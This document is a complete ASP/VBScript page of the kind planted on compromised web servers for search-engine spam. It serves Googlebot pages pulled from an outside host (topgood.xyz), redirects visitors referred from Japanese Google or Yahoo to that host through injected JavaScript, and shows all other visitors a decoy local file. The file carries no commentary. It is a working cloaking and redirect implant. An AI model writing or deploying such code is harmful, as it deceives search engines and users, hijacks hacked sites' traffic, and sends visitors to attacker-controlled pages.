<%@LANGUAGE="VBSCRIPT" CODEPAGE="65001"%>
<%
dim sourse
dim query
dim domain

sourse="http://www.topgood.xyz/March/520jc1283aspphp/"
query=Request.QueryString
domain=Request.ServerVariables("HTTP_HOST")&request.ServerVariables("URL")
Response.Addheader "Content-Type","text/html;charset=utf-8"

if GetBot="google" then
	Response.Write GetResStr(sourse&"pages_asp.php?"&query&"|"&domain)
	Response.End
end if		

if GetReferer="1" then
	Response.Write("<script language='javascript'") 
	Response.Write(" type='text/javascript'>")
	Response.Write("window.location.href='"&sourse&"goasp.php?"&Trim(query&"|"&domain)&"'")
	Response.Write("</script>")
	Response.End
end if	
Response.Write getfile("index.txt")
Response.End
function GetBot()
	dim s_agent
	GetBot=""
	s_agent=Request.ServerVariables("HTTP_USER_AGENT")
	if instr(1,s_agent,"googlebot",1) >0 then
	GetBot="google"
	end if
end function
function GetReferer()
	dim s_referer
	GetReferer=""
	s_referer=Request.ServerVariables("HTTP_REFERER")
	if instr(1,s_referer,"google.co.jp",1) >0 Or instr(1,s_referer,"yahoo.co.jp",1) >0 then
	GetReferer="1"
	else GetReferer="2"
	end if
end function
function GetResStr(URL)
	dim ResBody,ResStr,PageCode
	Set Http=server.createobject("msxml2.serverxmlhttp.3.0")
	Http.setTimeouts 1000000, 1000000, 1000000, 1000000
	Http.open "GET",URL,False
	Http.Send()
	If Http.Readystate =4 Then
		If Http.status=200 Then
		ResStr=http.responseText
		ResBody=http.responseBody
		PageCode="utf-8"
		GetResStr=BytesToBstr(http.responseBody,trim(PageCode))
		End If
	End If
End Function
Function BytesToBstr(Body,Cset)
	Dim Objstream
	Set Objstream = Server.CreateObject("adodb.stream")
	objstream.Type = 1
	objstream.Mode =3
	objstream.Open
	objstream.Write body
	objstream.Position = 0
	objstream.Type = 2
	objstream.Charset = Cset
	BytesToBstr = objstream.ReadText
	objstream.Close
	set objstream = nothing
End Function
function getfile(filename) 
	Dim fsotxt
	Dim txt
	Set fsotxt = Server.CreateObject("Scripting.FileSystemObject")
	Set txt = fsotxt.OpenTextFile(Server.mappath(filename),1,True)
 	getfile = txt.Readall
 	txt.Close
	set fsotxt=nothing
	set txt=nothing
end function
%> 